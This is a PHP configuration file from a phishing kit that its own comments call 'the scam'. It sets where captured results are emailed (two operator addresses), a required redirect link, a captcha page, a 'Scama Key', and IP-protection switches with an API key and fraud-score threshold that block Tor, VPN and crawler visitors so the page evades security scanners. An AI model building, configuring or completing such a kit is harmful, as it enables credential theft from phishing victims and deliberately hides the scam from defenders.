<?php
	// ================================= //
	// ================================= //
	$redirectlink = "";	 	 // You must use redirect or the scam will not open
	// ================================= //
	// ================================= //
	// This is your Scama Key if you post the scam will banned Don`t edit it =D
	$API_KEY = "";
	// This is your Scama Key if you post the scam will banned Don`t edit it =D
	// ================================= //
	$sendtoemail = "yes";  // If you don`t want the scam Send the Rezlt/ Result to email Edit |yes| to |no|
	$yours = "the.7op@yandex.com,faredm745@gmail.com"; 	 // Edit this to your email 
	// ================================= //
	// ================================= //
	$show_captcha ="yes"; 				 // If you don`t want to show ||Captcha Page|| edit |yes| to |no| 
	// ================================= //
	// ================================= //
	// ********* IP Protection ********* //
	$ip_protection = "no"; 			 // If you don`t want to use IP Protection change yes to no
	$ip_protection_api = "LYEX8EmkYEoO9wuWuMRtREVaFcD1hlpH"; // Dont touch :()
	$max_fraud_score = "75";			// Put max fraud score 
	$fuck_tor = "true";					// If you don`t want to disallow Tor Users change true to xAthena
	$fuck_vpn = "true";					// If you don`t want to disallow VPN Users change true to xAthena
	$fuck_crawler = "true";				// If you don`t want to disallow Crawler Users change true to xAthena
	// ================================= //
	// ================================= //
	/////////////////DATE-function//////////////////////
	function now() {
		date_default_timezone_set('GMT');
		return date("d/m/Y h:i:sa");
	}
	/////////////////DATE-function//////////////////////

?>